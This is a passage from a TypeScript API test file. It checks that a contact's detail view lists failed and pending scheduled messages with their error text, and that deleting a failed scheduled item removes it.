    await insert('failed', new Date(Date.now() - 9 * 24 * 3600_000).toISOString(), 'viejo');
    await insert('sent', new Date(Date.now() - 3600_000).toISOString(), null);
    const detail = (await env.api('GET', `/api/contacts/${id}`)).body;
    expect(detail.scheduled.map((s: any) => [s.id, s.status])).toEqual([
      [failed, 'failed'],
      [pending, 'pending'],
    ]);
    expect(detail.scheduled[0].error).toBe('Falta un parámetro requerido.');
    expect((await env.api('DELETE', `/api/scheduled/${failed}`)).status).toBe(204);
    expect((await env.api('GET', `/api/contacts/${id}`)).body.scheduled.map((s: any) => s.id)).toEqual([pending]);
  });
});
